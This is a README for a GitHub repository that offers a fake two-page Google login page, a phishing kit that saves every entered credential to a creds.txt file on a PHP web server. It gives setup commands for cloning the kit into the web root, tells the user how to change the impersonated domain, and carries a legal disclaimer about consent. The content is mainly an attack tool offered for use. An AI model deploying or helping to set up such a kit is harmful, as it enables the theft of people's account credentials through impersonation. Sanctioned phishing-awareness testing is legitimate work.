# GooglePhishing

This repository contains a fake two-part Google Login. It can be used on a web server that supports PHP files. Any entered credentials are saved in the <b>creds.txt</b> file. The Domain Suffix can be changed from @client.com to any website of your choosing. To do this, just edit line 21 of index.html. Follow steps below for a quick and easy setup.

<p float="left">
<img alt='Email Page' src='http://165.227.79.102/img/1.png?q=1' style='width:500px;'/>
<img alt='Password Page' src='http://165.227.79.102/img/2.png' style='width:500px;'/>
</p>

Legal Disclaimer: Usage of this repo for attacking targets without prior consent is illegal. It is the end user's responsiblity to obey applicable local, state and federal laws. Developer assumes no liability for any misuse or damage caused by this repo.

### Get Started

Run the below commands in the /var/www/html folder.

```
git clone https://github.com/jakedmurphy1/GooglePhishing.git
```

```
cd GooglePhishing
```

```
chmod 777 creds.txt
```
